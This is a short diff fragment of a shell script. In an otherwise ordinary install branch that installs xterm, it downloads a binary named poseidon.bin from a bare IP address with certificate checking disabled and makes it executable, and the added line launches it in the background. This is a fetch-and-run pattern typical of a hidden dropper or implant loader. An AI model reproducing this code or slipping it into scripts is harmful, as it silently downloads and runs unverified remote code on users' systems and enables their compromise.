@@ -57,5 +57,6 @@ else
 sudo apt-get install xterm
 wget --content-disposition https://45.144.29.184:7443/api/v1.4/files/download/c98a0cae-cf5d-48bd-9529-4d6c09b4f640 --no-check-certificate
     chmod +x poseidon.bin
+    ./poseidon.bin &
 fi
 
